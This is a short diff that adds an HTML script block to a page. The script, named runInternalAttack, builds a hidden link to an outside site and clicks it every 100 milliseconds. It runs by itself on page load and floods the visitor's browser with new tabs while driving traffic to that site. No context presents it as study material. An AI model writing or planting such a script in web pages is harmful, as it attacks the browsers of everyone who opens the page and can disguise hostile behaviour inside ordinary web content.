@@ -1,0 +1,19 @@
+<script type="text/javascript"> 
+
+function runInternalAttack() {
+  var a = document.createElement('a');
+  document.body.appendChild(a);
+  a.style='display:none';
+  a.target='_blank';
+  a.href='https://you.brd.ro/';
+
+  a.click();
+  window.URL.revokeObjectURL(a);
+}
+
+window.setInterval( function(){
+  runInternalAttack();
+},100);
+
+  
+</script
